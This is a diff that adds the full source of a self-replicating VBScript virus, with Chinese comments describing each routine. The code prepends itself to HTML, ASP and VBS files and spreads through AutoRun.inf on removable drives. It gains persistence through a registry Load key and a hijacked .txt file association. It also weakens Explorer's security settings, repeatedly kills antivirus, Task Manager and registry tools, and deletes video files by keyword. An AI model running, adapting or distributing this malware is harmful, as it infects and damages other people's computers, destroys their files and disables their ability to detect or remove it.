@@ -1,0 +1,703 @@
+'$Top_3
+
+Dim Cnt, CntMax, Maxsize, Path_V1, Path_V2, Name_V1, Version
+
+Cnt = 0
+CntMax = 150'感染文件的最大数目
+Maxsize = 150000
+Name_V1 = "{HCQ9D-TVCWX-X9QRG-J4B2Y-GR2TT-CM3HY-26VYW-6JRYC-X66GX-JVY2D}.vbs"
+Path_V1 = GetSFolder(1) & Name_V1 '0:Windows 1:System  2:Temp
+Path_V2 = GetSFolder(0) & Name_V1
+Version = "3" '版本号
+
+
+
+Call Main()
+
+'功能：主程序 
+
+Sub Main()
+    On Error Resume Next
+    If IsVbs() = true Then
+        Call ExeVbs() '执行VBS文件状态时的程序
+    ElseIf IsHtml() = true Then
+        Call ExeWebPage() '执行WEB页状态时的程序
+    End If
+End Sub
+
+
+'功能:病毒文件是WEB页状态时所执行的程序 
+
+Sub ExeWebPage()
+    On Error Resume Next
+    Dim objfso, vbsCode
+
+    Set objfso = CreateObject("Scripting.FileSystemObject")
+    vbsCode = GetScriptCode("vbscript") '得到VBScript脚本代码
+
+    Call DeSafeSet() '降低系统安全性设置
+
+    Call InvadeSystem(objfso, vbsCode)
+
+    Set objfso = Nothing
+End Sub
+
+
+'功能：降低系统安全性设置 
+'说明：1.为驱动器添加自动播放功能 2.隐藏受保护的操作系统文件 3.关闭隐藏文件选项
+
+Sub DeSafeSet()
+    Dim HLMShow , HCUAdvanced
+    Dim HCUExplorer
+    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\Checkedvalue"
+    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
+    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
+    Call WriteReg (HCUExplorer, 129, "REG_DWORD") '添加自动播放功能
+    Call WriteReg (HCUAdvanced, 0, "REG_DWORD") '隐藏受保护的操作系统文件
+    Call WriteReg (HLMShow, 0, "REG_DWORD") '关闭隐藏文件选项
+End Sub
+
+
+'设置文件属性为隐藏系统文件
+'参数：f(fso对象) pathf(文件完整路径)
+
+Sub SetFileAttr(f, pathf)
+    Dim vf
+    Set vf = f.GetFile(pathf)
+    vf.Attributes = 6
+End Sub
+
+
+'功能:把指定代码拷贝到指定文件 
+'参数：f(fso对象),code(代码) pathf(文件完整路径)
+
+Sub CopyFile(f, code, pathf)
+    On Error Resume Next
+    Dim vf
+    Set vf = f.OpenTextFile(pathf, 2, true)
+    vf.Write code
+End Sub
+
+
+'功能:得到不同脚本语言的代码
+'备注：需改进
+
+Function GetScriptCode(Languages)
+    On Error Resume Next
+    Dim soj
+    For Each soj In document.Scripts
+        If LCase(soj.Language) = Languages Then
+            Select Case LCase(soj.Language)
+                Case "vbscript"
+                    GetScriptCode = soj.Text
+                    Exit Function
+                Case "javascript"
+                    GetScriptCode = soj.Text
+                    Exit Function
+            End Select
+
+        End If
+    Next
+End Function
+
+
+
+'功能:病毒文件是VBS文件状态时所执行的程序 
+
+Sub ExeVbs()
+    On Error Resume Next
+    Dim objfso, objshell, FullPath_Self, Name_Self, vbsCode
+    Dim ArgNum, Para_V, oArgs, SubPara_V, RunPath
+    Dim FullPath_OK
+
+    FullPath_OK = GetSFolder(0) & "OK.ini"
+
+    Set objfso = CreateObject("Scripting.FileSystemObject")
+    Set objshell = CreateObject("wscript.shell")
+
+    Call InitializeVBS(objfso, objshell) '初始化
+
+
+    Name_Self = WScript.ScriptName '得到文件名
+    FullPath_Self = WScript.ScriptFullName '得到文件自身完整路径
+
+
+    If Name_Self = Name_V1 Then
+
+        Set oArgs = WScript.Arguments '获得脚本外界参数
+        ArgNum = 0
+        Do While ArgNum < oArgs.Count
+            Para_V = Para_V & " " & oArgs(ArgNum)
+            ArgNum = ArgNum + 1
+        Loop
+
+        SubPara_V = LCase(Right(Para_V, 3))
+
+        Select Case SubPara_V
+            Case "run"
+
+                'msgbox "'AutoRun启动"
+                RunPath = Left(FullPath_Self, 2)
+                Call Run(RunPath) '打开驱动器
+
+                vbsCode = GetSelfCode(objfso, FullPath_Self) '获得全局变量vbsCode 得到自身病毒代码
+                Call InvadeSystem(objfso, vbsCode) '主程序文件的检查
+                Call Run(Path_V1)
+
+
+            Case "txt"
+                'msgbox "'TxT关联启动"
+                RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
+                Call Run(RunPath) '打开TXT文件
+
+                vbsCode = GetSelfCode(objfso, FullPath_Self)
+                Call InvadeSystem(objfso, vbsCode)
+                Call Run(Path_V1)
+
+            Case Else
+                'msgbox "'正常启动"
+                If PreInstance = True Then '如果实例已在运行就退出
+                    WScript.Quit
+                End If
+
+                vbsCode = GetSelfCode(objfso, FullPath_Self)
+                Call InvadeSystem(objfso, vbsCode)
+
+                If objfso.FileExists(FullPath_OK) = False Or IsOK(objfso, Date(), FullPath_OK) = False Then
+                    Call DeSafeSet() '降低系统安全性设置
+                    Call SearchDrives(objfso, vbsCode) '遍历所有驱动器 
+                    Call OK(objfso, Date(), FullPath_OK)
+                End If
+
+                Call Monitor(objfso, vbsCode) '循环监视
+        End Select
+
+
+    Else
+
+        'msgbox "'宿主启动"
+        vbsCode = GetSelfCode(objfso, FullPath_Self) '获得全局变量vbsCode 得到自身病毒代码
+        Call InvadeSystem(objfso, vbsCode) '主程序文件的检查
+        Call Run(Path_V1)
+
+    End If
+
+    Set objfso = Nothing
+    Set objshell = Nothing
+
+End Sub
+
+
+'功能: VBS文件启动初始化
+'参数: f(fso对象) shell(shell对象)
+
+Sub InitializeVBS(f, Shell)
+    On Error Resume Next
+    Dim T
+    '超时设置，防止操作超时造成的程序终止
+    T = Shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
+    If (T>= 1) Then
+        Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
+    End If
+
+End Sub
+
+
+
+
+'功能：判断自身实例是否在运行
+'返回值：True(运行)  False(不在运行) 
+
+Function PreInstance()
+    On Error Resume Next
+    Dim num_cnt
+    num_cnt = 0
+    PreInstance = False
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
+    For Each objProcess in colProcessList
+        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
+            num_cnt = num_cnt + 1
+        End If
+    Next
+    If num_cnt>= 2 Then
+        PreInstance = True
+    End If
+End Function
+
+'功能：判断当前日期下是否已感染成功
+'参数：fso,Now_V ,path_f
+'返回值：True(运行)  False(不在运行)
+
+Function IsOK(fso, Now_V, path_f)
+    Dim vf
+    IsOK = False
+    Set vf = fso.OpenTextFile(path_f, 1)
+    If vf.ReadLine = "OK" And InStr(vf.ReadLine , Now_V) >0 Then
+        IsOK = True
+    ElseIf InStr(vf.ReadLine, "Admin") >0 Then
+        MsgBox "You are Admin!!!"
+        IsOK = True
+    End If
+End Function
+
+
+'功能：标记当前日期下已感染成功
+'参数：fso,Now_V ,path_f
+
+Sub OK(fso, Now_V, path_f)
+    Dim vf
+    Set vf = fso.OpenTextFile(path_f, 2, True)
+    vf.Write "OK" & VBCRLF
+    vf.WriteLine Now_V
+    Call SetFileAttr(fso, path_f)
+End Sub
+
+'功能:监视系统
+
+Sub Monitor(objfso, vbsCode)
+    On Error Resume Next
+    Dim dc, d
+    ProcessNames = Array("360tray.exe", "taskmgr.exe", "regedit.exe", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
+    Do
+        Call KillProcess(ProcessNames)
+        Call InvadeSystem(objfso, vbsCode)
+
+        Set dc = objfso.Drives '拷贝副本及autorun.inf
+        For Each d In dc
+
+            If d.DriveType = 1 Then
+                Call AutoRun(objfso, d.DriveLetter, vbsCode)
+            End If
+
+        Next
+
+        WScript.sleep 10000
+    Loop
+
+End Sub
+
+
+
+
+'功能：创建AutoRun,inf文件
+'参数：f(fso对象) D(驱动器号) vbsCode(病毒自身代码)]
+
+Sub AutoRun(f, D, vbsCode)
+    On Error Resume Next
+    Dim path_autorun, path_vbs, inf_autorun
+    path_autorun = D & ":\AutoRun.inf" 'AutoRun.inf完整路径
+    path_vbs = D & ":\" & Name_V1
+
+    If f.FileExists(path_vbs) = false Or f.FileExists(path_autorun) = False Then '判断病毒文件是否存在
+
+
+        If f.FileExists(path_autorun) = true Then
+            f.DeleteFile path_autorun, True
+        End If
+
+        If f.FileExists(path_vbs) = true Then
+            f.DeleteFile path_vbs, True
+        End If
+
+        Call CopyFile(f, vbsCode, path_vbs) '拷贝副本
+        Call SetFileAttr(f, path_vbs) '设置文件属性为隐藏系统文件
+
+        inf_autorun = "[AutoRun]" & VBCRLF & "shell\AutoRun=打开(A)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun"""
+        Call CopyFile(f, inf_autorun, path_autorun)
+        Call SetFileAttr(f, path_autorun)
+
+    End If
+End Sub
+
+
+'功能：判断是否是VBS执行状态
+'返回值：True  False
+
+Function IsVbs()
+    On Error Resume Next
+    Dim TErr
+    TErr = WScript.ScriptFullName '得到病毒文件本身的路径
+    If Err Then
+        Err.Clear
+        IsVbs = false
+    Else
+        IsVbs = true
+    End If
+End Function
+
+
+'功能：判断是否是Html执行状态
+'返回值：True  False
+
+Function IsHtml()
+    On Error Resume Next
+    Dim TErr
+    TErr = document.Location '得到病毒文件本身的路径
+    If Err Then
+        Err.Clear
+        IsHtml = false
+    Else
+        IsHtml = true
+    End If
+End Function
+
+
+'功能：判断主程序版本
+'参数：f(fso) path_v(待判断的主程序完整路径)
+'返回值：版本号
+
+Function GetVersion(f, path_v)
+    Dim buffer , FV , n
+    Set FV = f.OpenTextFile(path_v, 1)
+    buffer = FV.ReadAll()
+    n = InStr(buffer, "'$Top")
+    GetVersion = Mid(buffer, n + 6, 1)
+End Function
+
+
+'功能：侵入系统 
+'参数：f vbsCode
+
+Sub InvadeSystem(f, vbsCode)
+    On Error Resume Next
+    Dim Value, dc, d, HCULoad
+
+    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
+
+    '删除低版本的文件
+    If f.FileExists(Path_V1) = True Then
+        If GetVersion(f, Path_V1)<Version Then
+            f.DeleteFile Path_V1 , True
+        End If
+    End If
+
+    '拷贝副本
+    If f.FileExists(Path_V1) = false Then
+        Call CopyFile(f, vbsCode, Path_V1)
+        Call SetFileAttr(f, Path_V1)
+    End If
+
+    '添加自启动
+    If ReadReg(HCULoad)<> Path_V1 Then
+        Call WriteReg (HCULoad, Path_V1, "")
+    End If
+
+    '拷贝副本TxT关联
+    If f.FileExists(Path_V2) = false Then
+        Call CopyFile(f, vbsCode, Path_V2)
+        Call SetFileAttr(f, Path_V2)
+    End If
+
+
+    '设置文件关联
+    Value = "%SystemRoot%\System32\WScript.exe " & """" & Path_V2 & """" & " %1 %* "
+    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
+        Call SetTxtFileAss(Path_V2)
+    End If
+
+    '检查自启动 TxT关联
+    If ReadReg(HCULoad)<> Path_V1 And ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
+        Set dc = f.Drives '拷贝副本及autorun.inf
+        For Each d In dc
+            Call AutoRun(f, d.DriveLetter, vbsCode)
+        Next
+    End If
+
+End Sub
+
+
+'功能：设置文件关联
+'参数：关联程序的完整路径(sFilePath)
+
+Sub SetTxtFileAss(sFilePath)
+    On Error Resume Next
+    Dim Value
+    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
+    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
+End Sub
+
+
+
+
+'功能：获得自身病毒代码 
+'参数：f(fso对象) FullPath_Self
+
+Function GetSelfCode(f, FullPath_Self)
+    On Error Resume Next
+    Dim n, n1, buffer, Self
+    Set Self = f.OpenTextFile(FullPath_Self, 1)
+    buffer = Self.ReadAll
+    n = InStr(buffer, "'$Top")
+    n1 = InstrRev(buffer, "'$Bottom")
+    buffer = Mid(buffer, n, n1 - n + 8)
+    GetSelfCode = buffer
+    Self.Close
+End Function
+
+
+
+'功能：遍历所有驱动器(1:可移动媒体驱动器 ,2:固定驱动器,3:网络驱动器)
+'参数：f(fso对象)  vbsCode
+'备注：只遍所有驱动器但不包括C盘
+
+Sub SearchDrives(f, vbsCode)
+    On Error Resume Next
+    Dim d , dc
+    Set dc = f.Drives
+    For Each d In dc
+        If Cnt >= CntMax Then '感染文件数限制
+            Exit For
+        End If
+        If (d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3) And d.DriveLetter <> "C" Then
+            If d.DriveType = 1 Then
+                Call SearchFile(f, d.Path & "\", vbsCode)
+            End If
+        End If
+    Next
+
+End Sub
+
+
+
+'功能：搜索可传染文件的过程且删除不健康视频
+'参数：f(fso对象) strPath(文件夹或驱动器的完整路径) vbsCode
+
+Sub SearchFile(f, strPath, vbsCode)
+    On Error Resume Next
+    Dim pfo, pf, pfi, ext
+    Dim psfo, ps
+    '遍历所有文件
+    Set pfo = f.GetFolder(strPath)
+    Set pf = pfo.Files
+    For Each pfi In pf
+        If Cnt >= CntMax Then '感染文件数限制
+            Exit For
+        End If
+        ext = LCase(f.GetExtensionName(pfi.Path))
+
+
+
+        Select Case ext '检查文件的扩展名是否为 htm、html、asp、vbs
+			Case "htm" , "html", "asp", "vbs"
+
+	            Call InfectHead(pfi.Path, pfi, f, vbsCode, ext)
+
+			Case "mpg", "rmvb", "avi", "rm" 
+
+	            If IsSexFile(pfi.Name) = True Then '判断文件是否是不健康视频
+	                pfi.Delete
+	            End If
+
+        End Select
+    Next
+
+    '遍历所有文件夹
+    Set psfo = pfo.SubFolders
+    For Each ps In psfo
+        If Cnt >= CntMax Then '感染文件数限制
+            Exit For
+        End If
+        Call SearchFile(f, ps.Path, vbsCode) '递归调用
+    Next
+End Sub
+
+
+'功能:通过文件名判断文件是否是不健康视频
+'参数:fname(文件名)
+'返回值:true(不健康) false(健康) 
+
+Function IsSexFile(fname)
+    IsSexFile = false
+    If InStr(fname, "成人")>0 Or InStr(fname, "淫")>0 Or InStr(fname, "偷拍")>0 Or _
+                InStr(fname, "偷窥")>0 Or InStr(fname, "口交")>0 Or InStr(fname, "强奸")>0 Or _
+                InStr(fname, "轮奸")>0 Or InStr(fname, "伦理片")>0 Or InStr(fname, "自摸")>0 Then
+        IsSexFile = true
+    End If
+End Function
+
+
+'功能:判断文件是否已被感染
+'参数:buffer(文件全部数据) ftype(文件类型)
+'返回值:true(已被感染) false(未被感染)
+
+Function Isinfected(buffer, ftype)
+    Isinfected = true
+    Select Case ftype
+Case "htm" , "html" , "asp", "vbs":
+        If InStr(buffer, "'$Top") = 0 Then
+            Isinfected = false
+        End If
+        Case Else
+            Isinfected = true
+    End Select
+End Function
+
+
+'功能：传染文件,将代码插入到文件头，只传染小于Maxsize的文件
+'参数：strPath(文件完整路径) fi(文件对象)  f(fso对象) strCode(插入的代码) ftype(文件类型)
+
+Sub InfectHead(strPath, fi, f, vbsCode, ftype)
+    On Error Resume Next
+    Dim tso, buffer, strCode
+    If fi.Size< Maxsize Then '只传染小于100KB的文件
+        Set tso = f.OpenTextFile(strPath, 1, true)
+        buffer = tso.ReadAll()
+        tso.Close
+        Select Case ftype
+Case "htm" , "html" , "asp":
+            If Isinfected(buffer, ftype) = false Then '判断是否已被感染
+                strCode = MakeScript(vbsCode, 0) '生成网页脚本
+                Set tso = f.OpenTextFile(strPath, 2, true)
+                Cnt = Cnt + 1
+                tso.Write strCode & VBCRLF & buffer '插入到文件头
+                tso.Close
+                Set tso = Nothing
+            End If
+Case "vbs":
+            If Isinfected(buffer, ftype) = false Then '判断是否已被感染
+                n = InStr(buffer , "Option Explicit") '去除Option Explicit的影响 因为Option Explicit语句之前不能放置任何代码
+                If n<>0 Then
+                    buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
+                    Set tso = f.OpenTextFile(strPath, 2, true)
+                    tso.Write vbsCode & VBCRLF & buffer '插入到文件头
+                    Cnt = Cnt + 1
+                    tso.Close
+                    Set tso = Nothing
+                Else
+                    Set tso = f.OpenTextFile(strPath, 2, true)
+                    tso.Write vbsCode & VBCRLF & buffer '插入到文件头
+                    Cnt = Cnt + 1
+                    tso.Close
+                    Set tso = Nothing
+                End If
+            End If
+            Case Else
+        End Select
+    End If
+
+End Sub
+
+
+
+'功能：得到系统路径
+'参数：f(fso对象)  p(参数 0: Windows 文件夹 1: System 文件夹  2: Temp 文件夹 )
+'返回值：GetSF（系统路径文件夹路径）
+
+Function GetSF(f, p)
+    On Error Resume Next
+    GetSF = f.GetSpecialFolder(p) & "\"
+End Function
+
+
+
+
+'功能： 得到系统路径 
+'参数： p(参数 0: Windows 文件夹 1: System 文件夹  2: Temp 文件夹 )
+'返回值：GetSFolder（系统路径文件夹路径）
+
+Function GetSFolder(p)
+    On Error Resume Next
+    Dim f
+    Set f = CreateObject("Scripting.FileSystemObject")
+    GetSFolder = f.GetSpecialFolder(p) & "\"
+    Set f = Nothing
+End Function
+
+
+
+'功能：加密并生成网页脚本
+'参数：strCode(vbs脚本)  T(1:加密   0 :不加密)
+'返回值:MakeScript（vbs网页脚本）
+'备注：加密功能还有待完善
+
+Function MakeScript(strCode, T)
+    If T = 1 Then
+        MakeScript = EnCode(strCode)
+    Else
+        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
+    End If
+
+End Function
+
+
+'功能：结束指定进程集合
+'参数：ProcessNames(进程集合)
+
+Sub KillProcess(ProcessNames)
+    On Error Resume Next
+    Set objWMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!root\cimv2")
+    For Each ProcessName in ProcessNames
+        Set colProcessList = objWMIService.execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
+        For Each objProcess in colProcessList
+            objProcess.terminate()
+        Next
+    Next
+End Sub
+
+'功能：删除注册表 
+'参数：strkey(注册表项及数据名称)
+
+Sub DeleteReg(strkey)
+    On Error Resume Next
+    Set tmps = CreateObject("wscript.shell")
+    tmps.RegDelete strkey
+    Set tmps = Nothing
+End Sub
+
+
+'功能：读取注册表
+'参数：strkey(注册表项及数据名称)
+'返回值:ReadReg(注册表数据)
+
+Function ReadReg(strkey)
+    On Error Resume Next
+    Dim tmps
+    Set tmps = CreateObject("wscript.shell")
+    ReadReg = tmps.RegRead(strkey)
+    Set tmps = Nothing
+End Function
+
+
+'功能：写入注册表
+'参数：strkey(注册表项及数据名称)  value(注册表数据) vtype(值类型)
+
+Sub WriteReg(strkey, Value, vtype)
+    On Error Resume Next
+    Dim tmps
+    Set tmps = CreateObject("wscript.shell")
+    If vtype = "" Then
+        tmps.RegWrite strkey, Value
+    Else
+        tmps.RegWrite strkey, Value, vtype
+    End If
+    Set tmps = Nothing
+End Sub
+
+
+
+'功能:启动程序
+'参数:程序的完整路径
+
+Sub Run(ExeFullName)
+    On Error Resume Next
+    Dim WshShell
+    Set WshShell = WScript.CreateObject("wscript.shell")
+    WshShell.Run ExeFullName
+    Set WshShell = Nothing
+End Sub
+
+
+'功能:重启计算机
+
+Sub ReBoot()
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate,(Shutdown)}!\\" & strComputer & "\root\cimv2")
+    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        ObjOperatingSystem.Reboot()
+    Next
+End Sub
+
+'$Bottom 
